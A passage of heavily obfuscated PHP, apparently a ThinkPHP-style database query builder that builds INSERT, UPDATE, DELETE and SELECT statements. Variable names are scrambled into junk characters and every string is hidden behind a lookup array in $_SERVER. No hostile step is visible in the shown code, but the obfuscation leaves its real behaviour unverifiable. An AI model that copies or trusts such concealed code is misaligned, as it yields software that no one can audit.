$_SERVER[ÔÕ±ĞšÎ]; if (empty($…ş¿¯î¬)) { return !1; } $®à‡“·› = parse_url($…ş¿¯î¬); if ($®à‡“·›[$£èšèÑš[207]]) { $§Ú›ãµš = array($£èšèÑš[1040] => $®à‡“·›[$£èšèÑš[207]], $£èšèÑš[967] => isset($®à‡“·›[$£èšèÑš[667]]) ? $®à‡“·›[$£èšèÑš[667]] : $£èšèÑš[12], $£èšèÑš[968] => isset($®à‡“·›[$£èšèÑš[1064]]) ? $®à‡“·›[$£èšèÑš[1064]] : $£èšèÑš[12], $£èšèÑš[965] => isset($®à‡“·›[$£èšèÑš[208]]) ? $®à‡“·›[$£èšèÑš[208]] : $£èšèÑš[12], $£èšèÑš[966] => isset($®à‡“·›[$£èšèÑš[209]]) ? $®à‡“·›[$£èšèÑš[209]] : $£èšèÑš[12], $£èšèÑš[21] => isset($®à‡“·›[$£èšèÑš[87]]) ? substr($®à‡“·›[$£èšèÑš[87]], 1) : $£èšèÑš[12]); } else { preg_match($£èšèÑš[1065], trim($…ş¿¯î¬), $‰‘ñú¿Õ); $§Ú›ãµš = array($£èšèÑš[1040] => $‰‘ñú¿Õ[1], $£èšèÑš[967] => $‰‘ñú¿Õ[2], $£èšèÑš[968] => $‰‘ñú¿Õ[3], $£èšèÑš[965] => $‰‘ñú¿Õ[4], $£èšèÑš[966] => $‰‘ñú¿Õ[5], $£èšèÑš[21] => $‰‘ñú¿Õ[6]); } $§Ú›ãµš[$£èšèÑš[995]] = $£èšèÑš[12]; return $§Ú›ãµš; } protected function debug() { $ü‘œéÕ =& $_SERVER[ÔÕ±ĞšÎ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ü‘œéÕ[1066]; if (think_config($ü‘œéÕ[1067])) { think_status($ü‘œéÕ[1068]); think_trace($this->queryStr . $ü‘œéÕ[1069] . think_status($ü‘œéÕ[24], $ü‘œéÕ[1068], 6) . $ü‘œéÕ[1070], $ü‘œéÕ[12], $ü‘œéÕ[1071]); } } protected function parseLock($ÜåÖ×†Ğ = false) { $å±ŠÁëÃ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ÜåÖ×†Ğ) { return $å±ŠÁëÃ[12]; } if ($å±ŠÁëÃ[997] == $this->dbType) { return $å±ŠÁëÃ[1072]; } return $å±ŠÁëÃ[1073]; } protected function parseSet($òá¡‚êä) { $õ·âéı” =& $_SERVER[ÔÕ±ĞšÎ]; foreach ($òá¡‚êä as $‘Á¹êğ => $éŠ›Ùš‚) { if (is_array($éŠ›Ùš‚) && $õ·âéı”[374] == $éŠ›Ùš‚[0]) { $‹ïøÕÍ™[] = $this->parseKey($‘Á¹êğ) . $õ·âéı”[508] . $éŠ›Ùš‚[1]; } elseif (is_scalar($éŠ›Ùš‚) || is_null($éŠ›Ùš‚)) { $‹ïøÕÍ™[] = $this->parseKey($‘Á¹êğ) . $õ·âéı”[508] . $this->parseValue($éŠ›Ùš‚); } } return $õ·âéı”[1074] . implode($õ·âéı”[50], $‹ïøÕÍ™); } protected function bindParam($½Âèœƒ, $ë×ì«û˜) { $this->bind[$_SERVER[ÔÕ±ĞšÎ][4] . $½Âèœƒ] = $ë×ì«û˜; } protected function parseBind($û´¸€ûŠ) { $û´¸€ûŠ = array_merge($this->bind, $û´¸€ûŠ); $this->bind = array(); return $û´¸€ûŠ; } function parseKey(&$°Ó¨ù¸, $‚Ô‹„°ğ = true) { if ($‚Ô‹„°ğ) { $°Ó¨ù¸ = $this->parseKeyCheck($°Ó¨ù¸); } return $°Ó¨ù¸; } function parseKeyCheck($ˆí—òú¸) { $ş“¼şüç =& $_SERVER[ÔÕ±ĞšÎ]; $ˆí—òú¸ = trim($ˆí—òú¸); if (!preg_match($ş“¼şüç[1075], $ˆí—òú¸)) { think_exception($ş“¼şüç[1076] . $ˆí—òú¸); } return $ˆí—òú¸; } protected function parseValue($¢×Õå¿) { $ç½Âı¬ =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($¢×Õå¿)) { $¢×Õå¿ = $ç½Âı¬[1036] . $this->escapeString($¢×Õå¿) . $ç½Âı¬[1036]; } elseif (isset($¢×Õå¿[0]) && is_string($¢×Õå¿[0]) && strtolower($¢×Õå¿[0]) == $ç½Âı¬[374]) { $¢×Õå¿ = $this->escapeString($¢×Õå¿[1]); } elseif (is_array($¢×Õå¿)) { $¢×Õå¿ = array_map(array($this, $ç½Âı¬[1037]), $¢×Õå¿); } elseif (is_bool($¢×Õå¿)) { $¢×Õå¿ = $¢×Õå¿ ? $ç½Âı¬[91] : $ç½Âı¬[230]; } elseif (is_null($¢×Õå¿)) { $¢×Õå¿ = $ç½Âı¬[106]; } return $¢×Õå¿; } protected function parseField($ä¡¦áß¬) { $œüŸäÏ¨ =& $_SERVER[ÔÕ±ĞšÎ]; if (is_string($ä¡¦áß¬) && strpos($ä¡¦áß¬, $œüŸäÏ¨[50])) { $ä¡¦áß¬ = explode($œüŸäÏ¨[50], $ä¡¦áß¬); } if (is_array($ä¡¦áß¬)) { $ˆ±µ•€ü = array(); foreach ($ä¡¦áß¬ as $ƒÙÜÎëï => $©…²ºæñ) { if (!is_numeric($ƒÙÜÎëï)) { $ˆ±µ•€ü[] = $this->parseKey($ƒÙÜÎëï, !1) . $œüŸäÏ¨[1077] . $this->parseKey($©…²ºæñ); } else { $ˆ±µ•€ü[] = $this->parseKey($©…²ºæñ); } } $ÀƒøÕÛ˜ = implode($œüŸäÏ¨[50], $ˆ±µ•€ü); } elseif (is_string($ä¡¦áß¬) && !empty($ä¡¦áß¬)) { $ÀƒøÕÛ˜ = $ä¡¦áß¬; } else { $ÀƒøÕÛ˜ = $œüŸäÏ¨[222]; } return $ÀƒøÕÛ˜; } protected function parseTable($ß½ ó‹É) { $¦¥è´”å =& $_SERVER[ÔÕ±ĞšÎ]; if (is_array($ß½ ó‹É)) { $•ç¤ë½Š = array(); foreach ($ß½ ó‹É as $¾ñÂŠ£Û => $ÁòÑ­İó) { if (!is_numeric($¾ñÂŠ£Û)) { $•ç¤ë½Š[] = $this->parseKey($¾ñÂŠ£Û) . $¦¥è´”å[53] . $this->parseKey($ÁòÑ­İó); } else { $•ç¤ë½Š[] = $this->parseKey($¾ñÂŠ£Û); } } $ß½ ó‹É = $•ç¤ë½Š; } elseif (is_string($ß½ ó‹É)) { if (strstr($ß½ ó‹É, $¦¥è´”å[53])) { return $ß½ ó‹É; } $ß½ ó‹É = explode($¦¥è´”å[50], $ß½ ó‹É); array_walk($ß½ ó‹É, array($this, $¦¥è´”å[985])); } return $¦¥è´”å[979] . trim(implode($¦¥è´”å[1078], $ß½ ó‹É), $¦¥è´”å[463]) . $¦¥è´”å[979]; } protected function parseWhere($Ôß‚§¨ç) { $Ë ÷‹¿ =& $_SERVER[ÔÕ±ĞšÎ]; $É‹ºº‘­ = $Ë ÷‹¿[12]; if (is_string($Ôß‚§¨ç)) { $É‹ºº‘­ = $Ôß‚§¨ç; } else { $‡€ŒÇŠ = isset($Ôß‚§¨ç[$Ë ÷‹¿[1079]]) ? strtoupper($Ôß‚§¨ç[$Ë ÷‹¿[1079]]) : $Ë ÷‹¿[12]; if (in_array($‡€ŒÇŠ, array($Ë ÷‹¿[1080], $Ë ÷‹¿[1081], $Ë ÷‹¿[1082]))) { $‡€ŒÇŠ = $Ë ÷‹¿[53] . $‡€ŒÇŠ . $Ë ÷‹¿[53]; unset($Ôß‚§¨ç[$Ë ÷‹¿[1079]]); } else { $‡€ŒÇŠ = $Ë ÷‹¿[1083]; } foreach ($Ôß‚§¨ç as $¸í›§ãé => $ŠáøÖÂø) { $É‹ºº‘­ .= $Ë ÷‹¿[356]; if (is_numeric($¸í›§ãé)) { $¸í›§ãé = $Ë ÷‹¿[1084]; } if (0 === strpos($¸í›§ãé, $Ë ÷‹¿[11])) { $É‹ºº‘­ .= $this->parseThinkWhere($¸í›§ãé, $ŠáøÖÂø); } else { if (!preg_match($Ë ÷‹¿[1085], trim($¸í›§ãé))) { think_exception(think_lang($Ë ÷‹¿[1086]) . $Ë ÷‹¿[4] . $¸í›§ãé); } $è –Ê› = is_array($ŠáøÖÂø) && isset($ŠáøÖÂø[$Ë ÷‹¿[1087]]); $¸í›§ãé = trim($¸í›§ãé); if (strpos($¸í›§ãé, $Ë ÷‹¿[214])) { $¶¥¹í¢ç = explode($Ë ÷‹¿[214], $¸í›§ãé); $Ÿæ™ƒ¢æ = array(); foreach ($¶¥¹í¢ç as $È¢›“È => $·£Ù¹Áõ) { $ïîÂùÇ° = $è –Ê› ? $ŠáøÖÂø[$È¢›“È] : $ŠáøÖÂø; $Ÿæ™ƒ¢æ[] = $Ë ÷‹¿[339] . $this->parseWhereItem($this->parseKey($·£Ù¹Áõ), $ïîÂùÇ°) . $Ë ÷‹¿[984]; } $É‹ºº‘­ .= implode($Ë ÷‹¿[1088], $Ÿæ™ƒ¢æ); } elseif (strpos($¸í›§ãé, $Ë ÷‹¿[286])) { $¶¥¹í¢ç = explode($Ë ÷‹¿[286], $¸í›§ãé); $Ÿæ™ƒ¢æ = array(); foreach ($¶¥¹í¢ç as $È¢›“È => $·£Ù¹Áõ) { $ïîÂùÇ° = $è –Ê› ? $ŠáøÖÂø[$È¢›“È] : $ŠáøÖÂø; $Ÿæ™ƒ¢æ[] = $Ë ÷‹¿[339] . $this->parseWhereItem($this->parseKey($·£Ù¹Áõ), $ïîÂùÇ°) . $Ë ÷‹¿[984]; } $É‹ºº‘­ .= implode($Ë ÷‹¿[1083], $Ÿæ™ƒ¢æ); } else { $É‹ºº‘­ .= $this->parseWhereItem($this->parseKey($¸í›§ãé), $ŠáøÖÂø); } } $É‹ºº‘­ .= $Ë ÷‹¿[357] . $‡€ŒÇŠ; } $É‹ºº‘­ = substr($É‹ºº‘­, 0, -strlen($‡€ŒÇŠ)); } return empty($É‹ºº‘­) ? $Ë ÷‹¿[12] : $Ë ÷‹¿[1089] . $É‹ºº‘­; } protected function parseWhereItem($§İ‰ß¤, $§Œ’Á‰Ê) { $¹³Á‚‚• =& $_SERVER[ÔÕ±ĞšÎ]; $¥—õ¹ÒØ = $¹³Á‚‚•[12]; if (is_array($§Œ’Á‰Ê)) { if (is_string($§Œ’Á‰Ê[0])) { $§ÂÓ¿Îù = strtolower($§Œ’Á‰Ê[0]); if (in_array($§Œ’Á‰Ê[0], array($¹³Á‚‚•[508], $¹³Á‚‚•[1090], $¹³Á‚‚•[1091], $¹³Á‚‚•[1092], $¹³Á‚‚•[1093], $¹³Á‚‚•[1094]))) { $¥—õ¹ÒØ .= $§İ‰ß¤ . $¹³Á‚‚•[53] . $§Œ’Á‰Ê[0] . $¹³Á‚‚•[53] . $this->parseValue($§Œ’Á‰Ê[1]); } elseif (preg_match($¹³Á‚‚•[1095], $§Œ’Á‰Ê[0])) { $¥—õ¹ÒØ .= $§İ‰ß¤ . $¹³Á‚‚•[53] . $this->exp[$§ÂÓ¿Îù] . $¹³Á‚‚•[53] . $this->parseValue($§Œ’Á‰Ê[1]); } elseif (preg_match($¹³Á‚‚•[1096], $§Œ’Á‰Ê[0])) { if (is_array($§Œ’Á‰Ê[1])) { $¥ı„Ù£Ë = isset($§Œ’Á‰Ê[2]) ? strtoupper($§Œ’Á‰Ê[2]) : $¹³Á‚‚•[1081]; if (in_array($¥ı„Ù£Ë, array($¹³Á‚‚•[1080], $¹³Á‚‚•[1081], $¹³Á‚‚•[1082]))) { $€’–¶‚ = array(); foreach ($§Œ’Á‰Ê[1] as $£‘±è¼•) { $€’–¶‚[] = $§İ‰ß¤ . $¹³Á‚‚•[53] . $this->exp[$§ÂÓ¿Îù] . $¹³Á‚‚•[53] . $this->parseValue($£‘±è¼•); } $¥—õ¹ÒØ .= $¹³Á‚‚•[339] . implode($¹³Á‚‚•[53] . $¥ı„Ù£Ë . $¹³Á‚‚•[53], $€’–¶‚) . $¹³Á‚‚•[984]; } } else { $¥—õ¹ÒØ .= $§İ‰ß¤ . $¹³Á‚‚•[53] . $this->exp[$§ÂÓ¿Îù] . $¹³Á‚‚•[53] . $this->parseValue($§Œ’Á‰Ê[1]); } } elseif ($¹³Á‚‚•[374] == $§ÂÓ¿Îù) { $¥—õ¹ÒØ .= $¹³Á‚‚•[982] . $§İ‰ß¤ . $¹³Á‚‚•[53] . $§Œ’Á‰Ê[1] . $¹³Á‚‚•[1097]; } elseif (preg_match($¹³Á‚‚•[1098], $§Œ’Á‰Ê[0])) { $¥—õ¹ÒØ .= $§Œ’Á‰Ê[0]; } elseif (preg_match($¹³Á‚‚•[1099], $§Œ’Á‰Ê[0])) { if (isset($§Œ’Á‰Ê[2]) && $¹³Á‚‚•[374] == $§Œ’Á‰Ê[2]) { $¥—õ¹ÒØ .= $§İ‰ß¤ . $¹³Á‚‚•[53] . $this->exp[$§ÂÓ¿Îù] . $¹³Á‚‚•[53] . $§Œ’Á‰Ê[1]; } else { if (is_string($§Œ’Á‰Ê[1])) { $§Œ’Á‰Ê[1] = explode($¹³Á‚‚•[50], $§Œ’Á‰Ê[1]); } $î¿ŒÔ”Ú = implode($¹³Á‚‚•[50], $this->parseValue($§Œ’Á‰Ê[1])); $¥—õ¹ÒØ .= $§İ‰ß¤ . $¹³Á‚‚•[53] . $this->exp[$§ÂÓ¿Îù] . $¹³Á‚‚•[982] . $î¿ŒÔ”Ú . $¹³Á‚‚•[984]; } } elseif (preg_match($¹³Á‚‚•[1100], $§Œ’Á‰Ê[0])) { $êîƒ‘Û = is_string($§Œ’Á‰Ê[1]) ? explode($¹³Á‚‚•[50], $§Œ’Á‰Ê[1]) : $§Œ’Á‰Ê[1]; $¥—õ¹ÒØ .= $¹³Á‚‚•[982] . $§İ‰ß¤ . $¹³Á‚‚•[53] . $this->exp[$§ÂÓ¿Îù] . $¹³Á‚‚•[53] . $this->parseValue($êîƒ‘Û[0]) . $¹³Á‚‚•[1083] . $this->parseValue($êîƒ‘Û[1]) . $¹³Á‚‚•[357]; } else { think_exception(think_lang($¹³Á‚‚•[1086]) . $¹³Á‚‚•[4] . $§Œ’Á‰Ê[0]); } } else { $•··Øµ = count($§Œ’Á‰Ê); $½®éò“ = $¹³Á‚‚•[12]; if (is_string($§Œ’Á‰Ê[$•··Øµ - 1])) { $½®éò“ = isset($§Œ’Á‰Ê[$•··Øµ - 1]) ? strtoupper($§Œ’Á‰Ê[$•··Øµ - 1]) : $¹³Á‚‚•[12]; if (in_array($½®éò“, array($¹³Á‚‚•[1080], $¹³Á‚‚•[1081], $¹³Á‚‚•[1082]))) { $•··Øµ = $•··Øµ - 1; } } else { $½®éò“ = $¹³Á‚‚•[1080]; } for ($Œ†Òø¼” = 0; $Œ†Òø¼” < $•··Øµ; $Œ†Òø¼”++) { $êîƒ‘Û = is_array($§Œ’Á‰Ê[$Œ†Òø¼”]) ? $§Œ’Á‰Ê[$Œ†Òø¼”][1] : $§Œ’Á‰Ê[$Œ†Òø¼”]; if ($¹³Á‚‚•[374] == strtolower($§Œ’Á‰Ê[$Œ†Òø¼”][0])) { $¥—õ¹ÒØ .= $¹³Á‚‚•[339] . $§İ‰ß¤ . $¹³Á‚‚•[53] . $êîƒ‘Û . $¹³Á‚‚•[1097] . $½®éò“ . $¹³Á‚‚•[53]; } else { $°­Ü¹Ò¥ = is_array($§Œ’Á‰Ê[$Œ†Òø¼”]) ? $this->exp[strtolower($§Œ’Á‰Ê[$Œ†Òø¼”][0])] : $¹³Á‚‚•[508]; if (!$°­Ü¹Ò¥ && is_array($§Œ’Á‰Ê[$Œ†Òø¼”]) && in_array($§Œ’Á‰Ê[$Œ†Òø¼”][0], array($¹³Á‚‚•[508], $¹³Á‚‚•[1090], $¹³Á‚‚•[1091], $¹³Á‚‚•[1092], $¹³Á‚‚•[1093], $¹³Á‚‚•[1094]))) { $°­Ü¹Ò¥ = $§Œ’Á‰Ê[$Œ†Òø¼”][0]; } $¥—õ¹ÒØ .= $¹³Á‚‚•[339] . $§İ‰ß¤ . $¹³Á‚‚•[53] . $°­Ü¹Ò¥ . $¹³Á‚‚•[53] . $this->parseValue($êîƒ‘Û) . $¹³Á‚‚•[1097] . $½®éò“ . $¹³Á‚‚•[53]; } } $¥—õ¹ÒØ = substr($¥—õ¹ÒØ, 0, -4); } } else { $¥—õ¹ÒØ .= $§İ‰ß¤ . $¹³Á‚‚•[1101] . $this->parseValue($§Œ’Á‰Ê); } return $¥—õ¹ÒØ; } protected function parseThinkWhere($±ñá™“, $¦ş­«Üá) { $Ã‡‚Œâ =& $_SERVER[ÔÕ±ĞšÎ]; $Ô‘«üã¢ = $Ã‡‚Œâ[12]; switch ($±ñá™“) { case $Ã‡‚Œâ[429]: $Ô‘«üã¢ = $¦ş­«Üá; break; case $Ã‡‚Œâ[1084]: $Ô‘«üã¢ = is_string($¦ş­«Üá) ? $¦ş­«Üá : substr($this->parseWhere($¦ş­«Üá), 6); break; case $Ã‡‚Œâ[1102]: parse_str($¦ş­«Üá, $ù¥ñ³­‘); if (isset($ù¥ñ³­‘[$Ã‡‚Œâ[1079]])) { $­Ë§îÊ = $Ã‡‚Œâ[53] . strtoupper($ù¥ñ³­‘[$Ã‡‚Œâ[1079]]) . $Ã‡‚Œâ[53]; unset($ù¥ñ³­‘[$Ã‡‚Œâ[1079]]); } else { $­Ë§îÊ = $Ã‡‚Œâ[1083]; } $½‚ç¤ˆ = array(); foreach ($ù¥ñ³­‘ as $”—ê®ó‘ => $–“•µ§’) { $½‚ç¤ˆ[] = $this->parseKey($”—ê®ó‘) . $Ã‡‚Œâ[1101] . $this->parseValue($–“•µ§’); } $Ô‘«üã¢ = implode($­Ë§îÊ, $½‚ç¤ˆ); break; } return $Ô‘«üã¢; } protected function parseLimit($­­ó÷¾ó) { $õè­Ì‘µ =& $_SERVER[ÔÕ±ĞšÎ]; return !empty($­­ó÷¾ó) ? $õè­Ì‘µ[51] . $­­ó÷¾ó . $õè­Ì‘µ[53] : $õè­Ì‘µ[12]; } protected function parseJoin($’ıôİœ) { $ä¨û©®û =& $_SERVER[ÔÕ±ĞšÎ]; $ åÜÀ— = $ä¨û©®û[12]; if (!empty($’ıôİœ)) { if (is_array($’ıôİœ)) { foreach ($’ıôİœ as $À…ÓÜ’ => $ş•¸©Ë‹) { if (!1 !== stripos($ş•¸©Ë‹, $ä¨û©®û[1103])) { $ åÜÀ— .= $ä¨û©®û[53] . $ş•¸©Ë‹; } else { $ åÜÀ— .= $ä¨û©®û[1104] . $ş•¸©Ë‹; } } } else { $ åÜÀ— .= $ä¨û©®û[1104] . $’ıôİœ; } } $ åÜÀ— = preg_replace($ä¨û©®û[1105], think_config($ä¨û©®û[1009]) . $ä¨û©®û[1106], $ åÜÀ—); return $ åÜÀ—; } protected function parseOrder($ø±¿±ıı) { $¬‘ÙÛ¨Ë =& $_SERVER[ÔÕ±ĞšÎ]; if (is_array($ø±¿±ıı)) { $”­Ó¹¯ª = array(); foreach ($ø±¿±ıı as $º…íçÊ¥ => $Ú‰›ƒñÁ) { if (is_numeric($º…íçÊ¥)) { $”­Ó¹¯ª[] = $this->parseKey($Ú‰›ƒñÁ); } else { $Ú‰›ƒñÁ = in_array(strtoupper(trim($Ú‰›ƒñÁ)), array($¬‘ÙÛ¨Ë[1107], $¬‘ÙÛ¨Ë[1108])) ? $¬‘ÙÛ¨Ë[53] . $Ú‰›ƒñÁ : $¬‘ÙÛ¨Ë[12]; if (preg_match($¬‘ÙÛ¨Ë[1109], $º…íçÊ¥)) { $”­Ó¹¯ª[] = $this->parseKey($º…íçÊ¥) . $Ú‰›ƒñÁ; } else { think_exception($¬‘ÙÛ¨Ë[1110] . $º…íçÊ¥); } } } $ø±¿±ıı = implode($¬‘ÙÛ¨Ë[50], $”­Ó¹¯ª); } return !empty($ø±¿±ıı) ? $¬‘ÙÛ¨Ë[1111] . $ø±¿±ıı : $¬‘ÙÛ¨Ë[12]; } protected function parseGroup($—Ö¡á) { $ÉÈÈ™Í =& $_SERVER[ÔÕ±ĞšÎ]; return !empty($—Ö¡á) ? $ÉÈÈ™Í[1112] . $—Ö¡á : $ÉÈÈ™Í[12]; } protected function parseHaving($…‡è«ˆ¶) { $ªü—ğ  =& $_SERVER[ÔÕ±ĞšÎ]; return !empty($…‡è«ˆ¶) ? $ªü—ğ [1113] . $…‡è«ˆ¶ : $ªü—ğ [12]; } protected function parseComment($èæ–¤–) { $Í°é¨§ı =& $_SERVER[ÔÕ±ĞšÎ]; return !empty($èæ–¤–) ? $Í°é¨§ı[1114] . $èæ–¤– . $Í°é¨§ı[1115] : $Í°é¨§ı[12]; } protected function parseDistinct($­é¨³ÍÜ) { $†¾Î‚êî =& $_SERVER[ÔÕ±ĞšÎ]; return !empty($­é¨³ÍÜ) ? $†¾Î‚êî[1116] : $†¾Î‚êî[12]; } protected function parseUnion($à§ŞŸÂ–) { $óÜÆœÂ¬ =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($à§ŞŸÂ–)) { return $óÜÆœÂ¬[12]; } if (isset($à§ŞŸÂ–[$óÜÆœÂ¬[425]])) { $Îˆ¦ËÎ = $óÜÆœÂ¬[1117]; unset($à§ŞŸÂ–[$óÜÆœÂ¬[425]]); } else { $Îˆ¦ËÎ = $óÜÆœÂ¬[1118]; } foreach ($à§ŞŸÂ– as $Íğº˜Ä†) { $úşÍÖÓõ[] = $Îˆ¦ËÎ . (is_array($Íğº˜Ä†) ? $this->buildSelectSql($Íğº˜Ä†) : $Íğº˜Ä†); } return implode($óÜÆœÂ¬[53], $úşÍÖÓõ); } public function insert($·»úå®€, $©©ëÔ¤ç = array(), $ÔûõûÙñ = false) { $÷‡üÊÚ =& $_SERVER[ÔÕ±ĞšÎ]; $ ±‹”ÏË = $µôÓéÁ¡ = array(); $this->model = $©©ëÔ¤ç[$÷‡üÊÚ[360]]; foreach ($·»úå®€ as $œ¿´µû„ => $ø¼şÌ´ª) { if (is_array($ø¼şÌ´ª) && $÷‡üÊÚ[374] == $ø¼şÌ´ª[0]) { $µôÓéÁ¡[] = $this->parseKey($œ¿´µû„); $ ±‹”ÏË[] = $ø¼şÌ´ª[1]; } elseif (is_scalar($ø¼şÌ´ª) || is_null($ø¼şÌ´ª)) { $µôÓéÁ¡[] = $this->parseKey($œ¿´µû„); $ ±‹”ÏË[] = $this->parseValue($ø¼şÌ´ª); } } $ËŞô€Š = ($ÔûõûÙñ ? $÷‡üÊÚ[986] : $÷‡üÊÚ[987]) . $÷‡üÊÚ[988] . $this->parseTable($©©ëÔ¤ç[$÷‡üÊÚ[358]]) . $÷‡üÊÚ[982] . implode($÷‡üÊÚ[50], $µôÓéÁ¡) . $÷‡üÊÚ[983] . implode($÷‡üÊÚ[50], $ ±‹”ÏË) . $÷‡üÊÚ[984]; $ËŞô€Š .= $this->parseLock(isset($©©ëÔ¤ç[$÷‡üÊÚ[918]]) ? $©©ëÔ¤ç[$÷‡üÊÚ[918]] : !1); $ËŞô€Š .= $this->parseComment(!empty($©©ëÔ¤ç[$÷‡üÊÚ[431]]) ? $©©ëÔ¤ç[$÷‡üÊÚ[431]] : $÷‡üÊÚ[12]); return $this->execute($ËŞô€Š, $this->parseBind(!empty($©©ëÔ¤ç[$÷‡üÊÚ[362]]) ? $©©ëÔ¤ç[$÷‡üÊÚ[362]] : array())); } public function selectInsert($¦äëÕà, $‹Û³½¡§, $ä¶¥˜À = array()) { $“ì¼¹çõ =& $_SERVER[ÔÕ±ĞšÎ]; $this->model = $ä¶¥˜À[$“ì¼¹çõ[360]]; if (is_string($¦äëÕà)) { $¦äëÕà = explode($“ì¼¹çõ[50], $¦äëÕà); } array_walk($¦äëÕà, array($this, $“ì¼¹çõ[985])); $Ìé¢©€ß = $“ì¼¹çõ[1119] . $this->parseTable($‹Û³½¡§) . $“ì¼¹çõ[982] . implode($“ì¼¹çõ[50], $¦äëÕà) . $“ì¼¹çõ[1097]; $Ìé¢©€ß .= $this->buildSelectSql($ä¶¥˜À); return $this->execute($Ìé¢©€ß, $this->parseBind(!empty($ä¶¥˜À[$“ì¼¹çõ[362]]) ? $ä¶¥˜À[$“ì¼¹çõ[362]] : array())); } public function update($±ë‰ı‹, $ÓÀÌ ÃŠ) { $şÜ×©´’ =& $_SERVER[ÔÕ±ĞšÎ]; $this->model = $ÓÀÌ ÃŠ[$şÜ×©´’[360]]; $›ìäîù = $şÜ×©´’[1120] . $this->parseTable($ÓÀÌ ÃŠ[$şÜ×©´’[358]]) . $this->parseSet($±ë‰ı‹) . $this->parseWhere(!empty($ÓÀÌ ÃŠ[$şÜ×©´’[354]]) ? $ÓÀÌ ÃŠ[$şÜ×©´’[354]] : $şÜ×©´’[12]) . $this->parseOrder(!empty($ÓÀÌ ÃŠ[$şÜ×©´’[443]]) ? $ÓÀÌ ÃŠ[$şÜ×©´’[443]] : $şÜ×©´’[12]) . $this->parseLimit(!empty($ÓÀÌ ÃŠ[$şÜ×©´’[369]]) ? $ÓÀÌ ÃŠ[$şÜ×©´’[369]] : $şÜ×©´’[12]) . $this->parseLock(isset($ÓÀÌ ÃŠ[$şÜ×©´’[918]]) ? $ÓÀÌ ÃŠ[$şÜ×©´’[918]] : !1) . $this->parseComment(!empty($ÓÀÌ ÃŠ[$şÜ×©´’[431]]) ? $ÓÀÌ ÃŠ[$şÜ×©´’[431]] : $şÜ×©´’[12]); return $this->execute($›ìäîù, $this->parseBind(!empty($ÓÀÌ ÃŠ[$şÜ×©´’[362]]) ? $ÓÀÌ ÃŠ[$şÜ×©´’[362]] : array())); } public function delete($¥‡¼—Í¤ = array()) { $“¹‹àıÅ =& $_SERVER[ÔÕ±ĞšÎ]; $this->model = $¥‡¼—Í¤[$“¹‹àıÅ[360]]; $¸üÈı¨Ç = $“¹‹àıÅ[1121] . $this->parseTable($¥‡¼—Í¤[$“¹‹àıÅ[358]]) . $this->parseWhere(!empty($¥‡¼—Í¤[$“¹‹àıÅ[354]]) ? $¥‡¼—Í¤[$“¹‹àıÅ[354]] : $“¹‹àıÅ[12]) . $this->parseOrder(!empty($¥‡¼—Í¤[$“¹‹àıÅ[443]]) ? $¥‡¼—Í¤[$“¹‹àıÅ[443]] : $“¹‹àıÅ[12]) . $this->parseLimit(!empty($¥‡¼—Í¤[$“¹‹àıÅ[369]]) ? $¥‡¼—Í¤[$“¹‹àıÅ[369]] : $“¹‹àıÅ[12]) . $this->parseLock(isset($¥‡¼—Í¤[$“¹‹àıÅ[918]]) ? $¥‡¼—Í¤[$“¹‹àıÅ[918]] : !1) . $this->parseComment(!empty($¥‡¼—Í¤[$“¹‹àıÅ[431]]) ? $¥‡¼—Í¤[$“¹‹àıÅ[431]] : $“¹‹àıÅ[12]); return $this->execute($¸üÈı¨Ç, $this->parseBind(!empty($¥‡¼—Í¤[$“¹‹àıÅ[362]]) ? $¥‡¼—Í¤[$“¹‹àıÅ[362]] : array())); } public function select($ç¿„Â°˜ = array()) { $¯ÜØßìÇ =& $_SERVER[ÔÕ±ĞšÎ]; $this->model = $ç¿„Â°˜[$¯ÜØßìÇ[360]]; $î¨ŠãØó = $this->buildSelectSql($ç¿„Â°˜); $ÈĞ¯¸àÎ = isset($ç¿„Â°˜[$¯ÜØßìÇ[426]]) ? $ç¿„Â°˜[$¯ÜØßìÇ[426]] : !1; if ($ÈĞ¯¸àÎ) { $®«ì‰ÍÍ = is_string($ÈĞ¯¸àÎ[$¯ÜØßìÇ[97]]) ? $ÈĞ¯¸àÎ[$¯ÜØßìÇ[97]] : $¯ÜØßìÇ[1122] . md5($î¨ŠãØó); $âš«õ¡— = think_cache($®«ì‰ÍÍ, $¯ÜØßìÇ[12], $ÈĞ¯¸àÎ); if (!1 !== $âš«õ¡—) { return $âš«õ¡—; } } $›¼Äãşä = $this->query($î¨ŠãØó, $this->parseBind(!empty($ç¿„Â°˜[$¯ÜØßìÇ[362]]) ? $ç¿„Â°˜[$¯ÜØßìÇ[362]] : array())); if ($ÈĞ¯¸àÎ && !1 !== $›¼Äãşä) { think_cache($®«ì‰ÍÍ, $›¼Äãşä, $ÈĞ¯¸àÎ); } return $›¼Äãşä; } public function buildSelectSql($Èİ²ÄÓ = array()) { $ÓîøË =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($Èİ²ÄÓ[$ÓîøË[430]])) { if (strpos($Èİ²ÄÓ[$ÓîøË[430]], $ÓîøË[50])) { list($Õ›³™Ì, $ŠÊÀÛ¿•) = explode($ÓîøË[50], $Èİ²ÄÓ[$ÓîøË[430]]); } else { $Õ›³™Ì = $Èİ²ÄÓ[$ÓîøË[430]]; } $Õ›³™Ì = $Õ›³™Ì ? $Õ›³™Ì : 1; $ŠÊÀÛ¿• = isset($ŠÊÀÛ¿•) ? $ŠÊÀÛ¿• : (is_numeric($Èİ²ÄÓ[$ÓîøË[369]]) ? $Èİ²ÄÓ[$ÓîøË[369]] : 20); $Š‡Ê¿®° = $ŠÊÀÛ¿• * ((int) $Õ›³™Ì - 1); $Èİ²ÄÓ[$ÓîøË[369]] = $Š‡Ê¿®° . $ÓîøË[50] . $ŠÊÀÛ¿•; } if (think_config($ÓîøË[1123])) { $ÎÄüŠ³¸ = $ÓîøË[1124] . md5(serialize($Èİ²ÄÓ)); $µ±ñÙãÚ = think_cache($ÎÄüŠ³¸); if ($µ±ñÙãÚ) { return $µ±ñÙãÚ; } } $ù»±§×ö = $this->parseSql($this->selectSql, $Èİ²ÄÓ); $ù»±§×ö .= $this->parseLock(isset($Èİ²ÄÓ[$ÓîøË[918]]) ? $Èİ²ÄÓ[$ÓîøË[918]] : !1); if (isset($ÎÄüŠ³¸)) { think_cache($ÎÄüŠ³¸, $ù»±§×ö); } return $ù»±§×ö; } public function parseSql($•õèÌ¯¥, $ÕÅÁÄ½¡ = array()) { $ìæ€§ =& $_SERVER[ÔÕ±ĞšÎ]; 